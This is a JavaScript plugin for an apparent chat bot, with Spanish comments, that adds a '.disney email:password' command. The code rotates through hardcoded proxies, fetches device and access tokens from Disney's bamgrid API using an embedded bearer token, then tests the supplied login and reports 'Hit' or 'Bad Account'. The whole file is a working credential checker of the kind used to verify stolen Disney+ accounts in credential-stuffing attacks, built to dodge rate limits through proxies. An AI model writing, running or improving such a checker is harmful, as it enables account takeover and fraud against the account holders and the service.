
import axios from 'axios';

// Lista de proxies disponibles
const proxies = [
  'http://115.74.244.157:8181',
  'http://123.20.135.251:8181',
  'http://113.177.136.66:8181',
  'http://14.240.189.252:8181'
];

// Función para hacer una solicitud con proxy
const makeRequestWithProxy = async (url, headers, data, proxy) => {
  try {
    const response = await axios.post(url, data, {
      headers,
      proxy: {
        host: proxy.split(':')[0],
        port: proxy.split(':')[1],
      },
    });
    return response.data;
  } catch (error) {
    console.error(`Error con proxy ${proxy}:`, error.message);
    return null; // Retorna null si la solicitud falla con este proxy
  }
};

let handler = async (m, { conn, command, text, args, usedPrefix }) => {
  if (command === 'disney') {
    const [email, password] = text.split(':');

    if (!email || !password) {
      return conn.reply(m.chat, 'Formato inválido. Usa el formato: `.disney email:password`', m);
    }

    try {
      let assertion = null;
      let accessToken = null;

      // Probar con las proxies disponibles
      for (const proxy of proxies) {
        // Crear una nueva sesión para las solicitudes
        const headers = {
          'content-type': 'application/json',
          'authorization': 'Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84',
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        };

        const deviceData = JSON.stringify({ deviceFamily: "browser", applicationRuntime: "chrome", deviceProfile: "windows", attributes: {} });

        // Hacer la primera solicitud para obtener el assertion (dispositivo)
        const deviceResponse = await makeRequestWithProxy('https://global.edge.bamgrid.com/devices', headers, deviceData, proxy);

        if (deviceResponse && deviceResponse.assertion) {
          assertion = deviceResponse.assertion;
          break; // Si se obtiene el assertion, salimos del ciclo
        }
      }

      if (!assertion) {
        return conn.reply(m.chat, `Error al obtener assertion para ${email}. Puede que las proxies estén caídas. Intenta nuevamente más tarde.`, m);
      }

      // Si el assertion fue obtenido, hacer la solicitud para obtener el access token
      let accessTokenObtained = false;
      for (const proxy of proxies) {
        const tokenData = `grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token=${assertion}&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Adevice`;

        const tokenResponse = await makeRequestWithProxy('https://global.edge.bamgrid.com/token', { ...headers, 'content-type': 'application/x-www-form-urlencoded' }, tokenData, proxy);

        if (tokenResponse && tokenResponse.access_token) {
          accessToken = tokenResponse.access_token;
          accessTokenObtained = true;
          break; // Si se obtiene el access token, salimos del ciclo
        }
      }

      if (!accessTokenObtained) {
        return conn.reply(m.chat, `Error al obtener access token para ${email}. Puede que las proxies estén caídas. Intenta nuevamente más tarde.`, m);
      }

      // Hacer la solicitud de login con las credenciales del usuario
      let loginSuccess = false;
      for (const proxy of proxies) {
        const loginData = JSON.stringify({ email, password });
        const loginResponse = await makeRequestWithProxy('https://global.edge.bamgrid.com/idp/login', { ...headers, 'authorization': `Bearer ${accessToken}` }, loginData, proxy);

        if (loginResponse && loginResponse.id_token) {
          loginSuccess = true;
          break; // Si se obtiene id_token, salimos del ciclo
        }
      }

      if (loginSuccess) {
        conn.reply(m.chat, `Hit para ${email}`, m); // Respuesta de "Hit"
      } else {
        conn.reply(m.chat, `Bad Account para ${email}`, m); // Respuesta de "Bad"
      }

    } catch (error) {
      console.error('Error en la verificación:', error);
      conn.reply(m.chat, `Error al verificar las credenciales para ${email}. Intenta nuevamente más tarde.`, m);
    }
  }
};

// Establecer el comando
handler.command = ['disney'];

export default handler;
